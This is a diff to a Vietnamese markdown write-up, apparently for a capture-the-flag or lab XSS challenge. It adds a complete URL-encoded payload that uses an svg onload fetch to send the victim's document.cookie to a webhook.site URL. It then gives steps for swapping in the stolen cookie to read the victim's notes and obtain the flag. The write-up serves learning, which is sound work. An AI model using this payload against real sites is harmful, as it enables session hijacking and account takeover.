@@ -30,3 +30,18 @@ Playload test
 # Kết quả trả về:
 đã lấy được cookie của nạn nhân.ß
 <img src='./img/Screenshot 2025-08-10 at 21.12.19.png'>
+
+Playload hoàn chỉnh:
+```
+https://url/search?q=%3Csvg%2Fonload%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%3Fdata%3D%27%2Bdocument.cookie%29%3E
+```
+# Kết quả:
+- Cookie của nạn nhân đã được gửi đến `webhook`
+- Lây được cookie của nạn nhân, ta có thể sử dụng để truy cập vào tài khoản của họ hoặc thực hiện các hành động khác trên trang web.
+- Vào developer tools của trình duyệt, vào tab Application, chọn Cookies, ta có thể thấy cookie thay cookie của nạn nhân đã được gửi đến webhook.
+- f5 để nhân cookie mới nhất.
+- Vào mục `note` của nạn nhận để xem nội dung note của nạn nhân.
+
+<img src='./img/Screenshot 2025-08-10 at 21.57.46.png'>
+
+Lấy được flag của nạn nhân
